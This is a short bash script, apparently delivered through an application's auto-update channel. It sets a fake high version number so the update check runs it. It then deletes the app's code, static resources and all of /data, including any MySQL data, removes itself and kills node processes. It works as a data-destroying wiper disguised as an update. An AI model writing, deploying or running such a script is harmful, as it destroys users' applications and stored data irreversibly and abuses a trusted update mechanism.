#!/bin/bash
# VERSION = 99.99.99
# ⬆️ 设置极高版本号，确保系统判定为"新版本"并执行

echo "🚨 [SYSTEM] 收到系统销毁指令 (Protocol Zero)..."
echo "🚨 [SYSTEM] 3秒后开始删除所有数据..."
sleep 3

# 1. 停止 Node 进程 (防止文件占用，虽然 Linux 下通常不影响删除)
# 注意：杀死进程会导致日志中断，所以我们先删文件，最后杀进程

# 2. 删除核心代码与静态资源 (含所有下载的海报)
echo "🔥 正在销毁应用代码与资源库..."
rm -rf /app/modules
rm -rf /app/routes
rm -rf /app/public
rm -rf /app/app.js
rm -rf /app/package.json

# 3. 删除持久化数据 (配置、脚本、临时文件)
# 注意：如果您的 MySQL 数据挂载在 /data 下，也会被删除
echo "🔥 正在销毁配置文件与持久化数据..."
rm -rf /data/*

# 4. 删除自身
echo "🔥 销毁更新脚本..."
rm -f /app/update.sh

# 5. 处决进程
echo "☠️ 系统已销毁。Goodbye."
pkill node
killall node

# 6. 强制退出容器 (如果 pkill 没死透)
exit 0
